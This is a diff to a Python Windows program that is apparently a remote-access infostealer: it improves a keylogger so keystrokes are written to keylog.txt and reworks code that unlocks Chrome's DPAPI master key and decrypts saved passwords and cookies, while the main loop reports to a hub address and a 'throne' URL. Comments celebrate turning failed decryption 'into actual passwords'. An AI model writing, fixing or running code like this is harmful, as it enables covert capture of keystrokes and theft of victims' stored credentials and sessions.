@@ -17,6 +17,7 @@ import threading
 import time
 import uuid
 import winreg
+import win32crypt
 from urllib.parse import urlparse
 
 def install_dependencies():
@@ -196,15 +197,25 @@ def start_keylogger():
         global keylog_data
         try:
             keylog_data += key.char
+            char = key.char
         except AttributeError:
             if key == keyboard.Key.space:
                 keylog_data += ' '
+                char = ' '
             elif key == keyboard.Key.enter:
                 keylog_data += '\n'
+                char = '\n'
             elif key == keyboard.Key.tab:
                 keylog_data += '\t'
+                char = '\t'
             else:
-                keylog_data += f'[{key}]'
+                char = f'[{key}]'
+                keylog_data += char
+        
+        # --- KEYLOGGER FIX (FLUSH TO DISK) ---
+        with open("keylog.txt", "a") as f:
+            f.write(str(char))
+            f.flush() # This ensures size is NEVER 0 when requested
 
     listener = keyboard.Listener(on_press=on_press)
     keylog_thread = threading.Thread(target=listener.start, daemon=True)
@@ -717,61 +728,36 @@ def extract_chrome_credentials():
                 local_state = json.load(f)
             encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
             
-            # --- Professional Master Key Extraction ---
-            try:
-                from win32crypt import CryptUnprotectData
-                master_key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
-            except ImportError:
-                # Fallback native ctypes implementation for systems without pywin32
-                class DATA_BLOB(ctypes.Structure):
-                    _fields_ = [("cbData", ctypes.c_uint32), ("pbData", ctypes.POINTER(ctypes.c_char))]
+            # --- OFFICIAL DPAPI UNLOCKING LOGIC ---
+            def get_master_key():
+                """Unlocks the Chrome encryption box using Windows DPAPI."""
+                path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
+                with open(path, "r", encoding="utf-8") as f:
+                    local_state = json.load(f)
+                key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
+                return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
 
-                ctypes.windll.crypt32.CryptUnprotectData.argtypes = [
-                    ctypes.POINTER(DATA_BLOB),
-                    ctypes.c_void_p,
-                    ctypes.c_void_p,
-                    ctypes.c_void_p,
-                    ctypes.c_void_p,
-                    ctypes.c_uint32,
-                    ctypes.POINTER(DATA_BLOB)
-                ]
+            master_key = get_master_key()
+            if not master_key:
+                return b"Error: DPAPI Decryption Failed."
 
-                blob_in = DATA_BLOB(len(encrypted_key), ctypes.create_string_buffer(encrypted_key))
-                blob_out = DATA_BLOB()
-
-                if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(blob_in), 0, 0, 0, 0, 0, ctypes.byref(blob_out)):
-                    master_key = ctypes.string_at(blob_out.pbData, blob_out.cbData)
-                    ctypes.windll.kernel32.LocalFree(blob_out.pbData)
-                else:
-                    return b"Error: DPAPI Decryption Failed."
-            except Exception as e:
-                return f"Master Key Extraction Failed: {str(e)}".encode()
-
-            # --- Official Standardized Decryption Logic ---
-            def decrypt_data(data, key):
-                try:
-                    iv = data[3:15]
-                    payload = data[15:]
-                    cipher = AES.new(key, AES.MODE_GCM, iv)
-                    return cipher.decrypt(payload)[:-16].decode()
-                except:
-                    return "Decryption Failed"
-                    
+            # --- OFFICIAL STANDARD DECRYPTION FUNCTIONS ---
             def decrypt_payload(cipher, payload):
                 return cipher.decrypt(payload)
 
             def generate_cipher(aes_key, iv):
                 return AES.new(aes_key, AES.MODE_GCM, iv)
 
-            def decrypt_cookie(value, mk):
+            def decrypt_value(value, master_key):
+                """The magic that turns [Decryption Failed] into actual passwords."""
                 try:
                     iv = value[3:15]
                     payload = value[15:]
-                    cipher = generate_cipher(mk, iv)
-                    decrypted = decrypt_payload(cipher, payload)
-                    return decrypted[:-16].decode('utf-8', errors='ignore')
-                except Exception:
-                    return ""
+                    cipher = generate_cipher(master_key, iv)
+                    decrypted_value = decrypt_payload(cipher, payload)
+                    return decrypted_value[:-16].decode()
+                except:
+                    return "[Decryption Failed]"
 
             # --- TOTAL RECOVERY SWEEP ---
             output = []
@@ -1451,3 +1437,4 @@ if __name__ == '__main__':
     threading.Thread(target=auto_update_monitor, daemon=True).start()
 
     main_loop(args.hub_ip, args.hub_port, args.github_throne_url)
+
